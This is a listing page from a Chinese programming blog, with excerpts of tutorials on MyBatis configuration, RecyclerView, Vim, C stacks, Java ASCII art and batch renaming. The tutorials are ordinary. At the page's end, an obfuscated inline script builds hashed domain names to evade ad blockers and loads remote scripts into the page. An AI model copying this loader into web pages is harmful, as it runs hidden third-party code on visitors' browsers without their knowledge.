		1、本篇博文的背景和目的 我本人正在学习MyBatis框架，在原先了解并且懵懵懂懂使用的基础上，开始系统正式的学习。阐述了MVC架构模式和三层架构，回顾了JDBC连接数据库，建立了使用MyBatis和MySQL的Maven项目，解释了STDOUT_LOGGING日志和手动提交事务，记录了MyBatis中#占位符的使用方法，回顾了MyBatis执行SQL语句的过程和使用到的一些重要类和接口，记录了将固定化的代码整合到一个工具类MyBatisUtil中，以减少代码量。记录了dao层接口的实现以及为什么要实现它。记录了MyBatis动态代理和使用动态代理的要求以及使用了动态代理生成的实现类。记录了MyBatis框架下传参的五种方法，占位符#和$，如何自定义别名，resultType属性的使用方法，如何处理数据库中列名和JAVA对象属性名不一致的情况，如何组装传递模糊查询的条件（一共有两种方式），动态SQL中&lt;if&gt;标签，&lt;where&gt;标签，&lt;sql&gt;标签的使用。本篇博文简单总结一下MyBatis中的配置文件。（其实前面最初的博客中我也零零星星的都涉及到了）。
2、我的上一篇博文 我上一篇博文记录的是动态SQL中&lt;sql&gt;标签和&lt;include&gt;标签的使用，感兴趣的读者可以移步查阅，链接如下所示：
MyBatis学习：动态SQL mapper.XML配置文件中＜sql＞标签和＜include＞标签的使用_你是我的日月星河的博客-CSDN博客https://blog.csdn.net/weixin_46281472/article/details/127182983
3、MyBatis配置文件的分类 MyBatis配置文件分为两类，一类是总配置文件，还有一类是写SQL语句的mapper文件。二者都是XML文件。
主配置文件：提供MyBatis的全局设置， 比方说 日志，数据源，mapper文件的位置等；
mapper文件： 主要就是写SQL语句的， 一般就是 一个表对应一个mapper文件。
4、主配置文件 主配置文件的所有配置信息都是在&lt;configuration&gt;&lt;/configuration&gt;标签里面的。
里面的标签是有先后顺序的，Windows下，可以按着Ctrl键，鼠标左键点击&lt;configuration&gt;标签，进入到如下界面中看标签的先后顺序，如下图所示：
首先看一下&lt;settings&gt;标签：这个标签里面可以有很多的&lt;setting&gt;标签，都是进行全局配置的，一般情况下不需要我们刻意的配置，使用默认值就可以了。也比较多，不太可能全都详细了解，具体还需要到MyBatis官网看一下。下面的代码只是配置了打印日志的方式：
&lt;settings&gt; &lt;setting name="logImpl" value="STDOUT_LOGGING"/&gt; &lt;!-- 指定 MyBatis 所用日志的具体实现 --&gt; &lt;!-- &lt;setting name="mapUnderscoreToCamelCase" value="true"/&gt; 驼峰式命名 --&gt; &lt;/settings&gt; 再粘贴一张官网的图片：
然后就是接着可以使用&lt;typeAliases&gt;标签，就是给实体类定义别名的。这个我本专栏写过一篇博文专门进行了记录，这里不再多说了，直接给出对应的链接：
MyBatis学习：自定义别名_你是我的日月星河的博客-CSDN博客_mybatis 属性别名https://blog.csdn.net/weixin_46281472/article/details/126242249再下面主要使用的就是&lt;environments&gt;&lt;/environments&gt;标签：先看一段示例代码吧，
&lt;environments default="development"&gt; &lt;environment id="development"&gt; &lt;transactionManager type="JDBC"&gt;&lt;/transactionManager&gt; &lt;!--下面的这个是配置数据源， 其实是可以不需要的， 因为我们在 application.yml文件中已经配好了 作用是用来创建Connection对象的 --&gt; &lt;dataSource type="POOLED"&gt; &lt;!--这个就是驱动的--&gt; &lt;property name="driver" value="com.mysql.cj.jdbc.Driver"/&gt; &lt;!--这个就是连接数据库的url 这里有一个注意 就是不能直接使用 &amp; 这个叫做实体， 需要用&amp;amp; 代替，跟HTML是一样的--&gt; &lt;property name="url" value="jdbc:mysql://localhost:3306/ssm?useUnicode=true&amp;amp;characterEncoding=utf8&amp;amp;zeroDateTimeBehavior=convertToNull&amp;amp;useSSL=true&amp;amp;serverTimezone=GMT%2B8"/&gt; &lt;!-- 下面这个就是配置用户名 --&gt; &lt;property name="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bfa072cdbd2078691154e935ede02d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c34b35572fd1610b2f91af2d5eddd42/" rel="bookmark">
			2020年GlobeLand 30地表覆盖数据集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GlobeLand 30数据集包含十个主要的地表覆盖类型，分别是耕地、森林、草地、灌木地、湿地、水体、苔原、人造地表、裸地、冰川和永久积雪。
GlobeLand30包含的类型及代码
不同分辨率全球地表覆盖比较
2000年和2010年GlobeLand30数据集可支持地表覆盖变化的监测和分析。该数据集由同一个研究团队利用相同的分类方法研制，具有较好的一致性，确保了数据分析的客观性和准确性。
耕地 死海水域变化
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94475bf72d456d3856b3edde8768d95d/" rel="bookmark">
			Android开发—RecyclerView使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.RecyclerView是什么 RecyclerView 在Android中用于创建列表。
官网的解释为： RecyclerView 可以让您轻松高效地显示大量数据。您提供数据并定义每个列表项的外观，而 RecyclerView 库会根据需要动态创建元素。
当RecyclerView的列表项滚出屏幕的时候，RecyclerView不会销毁该视图，相反而是将这些视图复用到新的列表项中。可以显著提高性能，改善响应能力并且减少功耗
2.RecyclerView怎么使用 确定列表或者网格的外观(流式布局、横向布局、纵向布局等)设计列表中每一个项目的样式。通过样式来定义ViewHolder类定义和ViewHolder相关联的Adapter 2.1定义布局 LinearLayoutManager： 列表布局GridLayoutManager ： 网格布局StaggeredGridLayoutManager： 流式布局 2.2定义ViewHolder和Adapter 示例代码：CustomAdapter.java
public class CustomAdapter extends RecyclerView.Adapter&lt;CustomAdapter.ViewHolder&gt; { private String[] localDataSet; /** * 自定义布局 * (custom ViewHolder). */ public static class ViewHolder extends RecyclerView.ViewHolder { private final TextView textView; public ViewHolder(View view) { super(view); textView = (TextView) view.findViewById(R.id.textView); } public TextView getTextView() { return textView; } } /** * 构造函数，初始化数据集 * * @param dataSet String[] containing the data to populate views to be used * by RecyclerView.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/94475bf72d456d3856b3edde8768d95d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2f78831d4d7819d92a96850c4dfc6ae/" rel="bookmark">
			图机器学习课程笔记1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		维生素C吃多了会上火-个人CSDN博文目录
cs224w（图机器学习）2021冬季课程学习笔记集合
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/543da42d468c14b6c81f04e4dea556d6/" rel="bookmark">
			图机器学习课程笔记集合
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 维生素C吃多了会上火-个人CSDN博文目录
目录 课程链接课程笔记 课程链接 CS224W: Machine Learning with Graphs
课程笔记 图机器学习课程笔记1图机器学习课程笔记2图机器学习课程笔记3图机器学习课程笔记4图机器学习课程笔记5图机器学习课程笔记6图机器学习课程笔记7图机器学习课程笔记8图机器学习课程笔记9 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c278d512282ee62e695c5b009ab20aa/" rel="bookmark">
			数据结构|C语言实现堆栈应用 将一个非负十进制转换为d进制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		栈操作及应用：将一个非负十进制整数转换成d进制，并输出
算法思想：十进制数N转换成其他d进制数的转换公式 N=(N DIV d)*d+N MOD d,其中：DIV为整除运算，MOD为求余运算（取模），d为进制数。
//栈操作及应用：将一个非负十进制整数转换成d进制，并输出 // 算法思想：十进制数N转换成其他d进制数的转换公式 N=(N DIV d)*d+N MOD d, //其中：DIV为整除运算，MOD为求余运算（取模），d为进制数。 #include &lt;stdio.h&gt; #define MaxStackSize 32 //最大的存储个数 typedef int DataType; //存储的数据类型为int型----给int取别名为DataType typedef struct { DataType stack[MaxStackSize]; //存储数据的顺序数组 int top; //栈顶 } SeqStack; //初始化StackInitiate(SeqStack *S) void StackInitiate(SeqStack *S) { S-&gt;top = 0; //栈顶置空 } //非空否StackNotEmpty(SeqStack S) int StackNotEmpty(SeqStack S) { if (S.top &lt;= 0) return 1; //如果栈顶 &lt;= 0，说明栈为空 返回1 else return 0; //不为空则 返回0 } //入栈StackPush(SeqStack *S , DataType x) int StackPush(SeqStack *S, DataType x) // x为入栈的数据元素 { if (S-&gt;top &gt;= MaxStackSize) { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c278d512282ee62e695c5b009ab20aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d25dbd6844391b5df696e23be007aa6c/" rel="bookmark">
			第四章 Vim - Vi 编辑器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vim是什么 Vi IMproved（简称Vim）是一个高度可配置的文本编辑器，跟Unix编辑器Visual interface（简称Vi）功能一样， Vi 是比较古老的一款字处理器，不过功能已经很齐全了，但是还有很多不足的地方需要改进。区别于Vi，Vim是Vi的增强版它支持代码补全、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用，是特别不错的一款编辑器。
Vi/Vim 的工作模式 要使用Vim跟Vi首先你需要掌握它们的工作模式，分别是命令模式（Command mode），输入模式（Insert mode）和底线命令模式（Last line mode）。 这三种模式的作用分别是：
命令模式 执行Vim或Vi命令回车，就会进入命令模式。在命令模式下输入键盘字符就会被Vim （Vi）识别为命令，比如我们在命令模式下输入i，i就会被Vim当做为命令，若想编辑文本则，启动Vim，进入到命令模式，输入i，切换到输入模式即可，命令模式只有一些最基本的命令。命令模式下比较常用的命令如光标跳转、复制、粘贴、删除、查找、撤销、保存：
输入模式 命令模式下输入i、a、o等字符就会进入到输入模式，在输入模式中，比较常用的按键如下：
Esc键：退出输入模式，切换到命令模式（经常用）
字符按键以及Shift组合：输入字符
Enter：回车键，换行
Del：删除键，删除光标后一个字符
方向键：在文本中移动光标
Home/End：移动光标到行首/行尾
Page Up/Page Down：上/下翻页
Instrt：切换光标为输入/替换模式，光标将变成竖线/下划线
底线命令模式 命令模式下按下 “ ：”（英文冒号），就会进入到底线命令模式，底线命令模式可以输入单个或者多个字符命令，可用的命令非常多，在底线模式中，常用的命令如保存、退出、文件操作、字符串替换、开关参数控制：
Vim/Vi使用模式 使用Esc键我们可以随时退出到命令模式，下面是Vim跟Vi的主要使用模式。
Vim/Vi实践操作 使用Vim跟Vi进入到命令模式，首先通过Vim创建一个文件，我们可以这样做：
#: 使用Vim创建file.txt文本并编辑，Vi创建文本编辑跟Vim过程是一样的。 [root@localhost ~]# vim file.txt [root@localhost ~]# vi file.txt 输入Vim 文件路径，回车进入命令模式 使用Vim跟Vi的时候需要注意，命令后面一定带上文件名。
输入i、a、o进入输入模式 进入到输入模式就可以开始编辑字符了，用Vi的时候进入到输入模式，可以发现在左下角状态栏中会出现 –INSERT- 的字样，那就是可以输入任意字符的提示。这个时候，键盘上除了 Esc 这个按键之外，其他的按键都可以视作为一般的输入按钮。
输入Esc回到命令模式 在输入模式下编辑完后，输入Esc即可回到命令模式，回到命令模式左下角的–INSERT-消失了，证明退回命令模式了，如图可以看到：
在命令模式中输入: wq，保存后离开Vim 退回到命令模式下，我们需要保存退出，输入:wq 回车，即可保存离开，要是不保存退出输入:q! 就行
回车后我们就创建了file.txt 文件。
Vim/Vi 按键说明 其实 Vim跟Vi 还有非常多的按键可以使用，下面是Vim跟Vi的键盘图，各位可以去尝试一下。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e38fa2e27b14c52b956fcf87b62c982/" rel="bookmark">
			基于Java的图片字符画(含动图)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、介绍 字符画是一种纯由字符组成，在文本编辑器中行列排开的二维字符矩阵中，整体展示出可识别的图案。特点是无色，画面的最小单元是字符而非像素。可由基本的文本编辑器模拟图像。
字符画的展示：
蜡笔小心表情转换为字符画后的效果
字符画 原图片 二、原理 图片文件的本质是像素矩阵，每个点储存的有该点的色彩信息。计算机在处理图片时将每个点解析为不同的颜色，并显示在屏幕上构成了视觉上的图片。
单个像素点的颜色由三原色RGB三个变量决定。若RGB皆为0，即十六进制下的#000000，没有颜色填充的点，该点颜色为纯黑。RGB皆为255，即十六进制下的#FFFFFF，填充满三原色，混合为白色。
灰度是表明像素点明暗程度的数值，也即黑白图像中点的颜色深度，范围在0到255，纯白为255 ，纯黑为0。灰度值指的是单个像素点的亮度。灰度值越大表示越亮。 字符画的实现是将源图片的RGB矩阵转换为灰度矩阵，再根据灰度的明暗程度选择不同密度的字符替换掉像素点，并打印该字符矩阵，即可得到字符画。 越亮的点，其占位字符密度越低，越暗的点，其占位字符密度高，即可在宏观程度上体现整幅图片的明暗变化。 像素点由明到暗，相对于的字符集由稀疏到密集，定义拥有该特性的字符集。
这里提供一种有效的字符集：
char[] ss = " `.^,:~\"&lt;!ct+{i7?u30pw4A8DX%#HWM".toCharArray(); 该字符集从0下标开始，随着下标的递增，字符像素的密度也逐渐增大，模拟出了明暗的渐变效果，因此可作为灰度的映射。
三、实现 Java中用于处理图片的类是Image类，Image是一个抽象类，其实现类BufferedImage可以将图片加载到内存当中，其所表示的图片在内存中拥有一个缓冲区，因此可以很方便的操作图片。并且该实现类也提供了绘图相关的api。
本程序只需要获取图片的宽高属性，以及各像素点属性。
我们需要将字符通过IO流输出到指定文本文件内，之后打开该文件即可查看。因此采用字符缓冲流进行文件操作。
BufferedWriter bw = new BufferedWriter(new FileWriter(target)); 其中 target 为目标文本文件的路径，可填绝对路径，或相对路径（当前工作区开始）
定义BufferedImage并加载指定图片。
BufferedImage bi = ImageIO.read(Files.newInputStream(Paths.get(ImageSource))); int width = bi.getWidth(); int height = bi.getHeight(); 其中 ImageSource 为图片的文件路径。如：“D:\\picture\\1.jpg”。 加载完后调用BufferedImage对象的成员获取图片的宽高属性width 和 height。
对于单像素点的操作有
int pixel = bi.getRGB(i, j); int[] rgb = new int[3]; //分别表示红绿蓝RGB。 rgb[0] = pixel &gt;&gt; 16 &amp; 0xff; rgb[1] = pixel &gt;&gt; 8 &amp; 0xff; rgb[2] = pixel &amp; 0xff; 调用对象的 getRGB(int x,int y) 方法可以得到一个像素点色值的十六进制数返回值。若要分离RGB3个变量，可以通过位运算的方式，每次取其中的两位。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e38fa2e27b14c52b956fcf87b62c982/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ddf95a9bc173aca847c3715ba0ae2e0/" rel="bookmark">
			Bat批处理使用ren批量重命名文件,比如批量去掉文件名称的前4位
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		从手机下导入一批照片到电脑，照片开头都是以IMG_开头，甚是烦，使用ren可以批量去掉IMG_开头的几个字符，参考如下"去掉文件名称的最前面4位"
去掉文件名称的最后5位，去掉的5位包括.jpg这四个后缀
@echo off ::Deep Lee setlocal enabledelayedexpansion for %%f in (*.jpg) do ( echo %%f set name=%%f ren !name! !name:~0,-5%!	) pause 去掉文件名称的最后5位，去掉的5位包括.jpg这四个后缀，再加上.png这四位
@echo off ::Deep Lee setlocal enabledelayedexpansion for %%f in (*.jpg) do ( echo %%f set name=%%f ren !name! !name:~-5%!.png	) pause 去掉文件名称的最前面4位
@echo off ::Deep Lee setlocal enabledelayedexpansion for %%f in (*.jpg) do ( echo %%f set name=%%f ren !name! !name:~4%!	) pause 只保留文件名称的后面4位
@echo off ::Deep Lee setlocal enabledelayedexpansion for %%f in (*.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3ddf95a9bc173aca847c3715ba0ae2e0/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/225/">«</a>
	<span class="pagination__item pagination__item--current">226/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/227/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>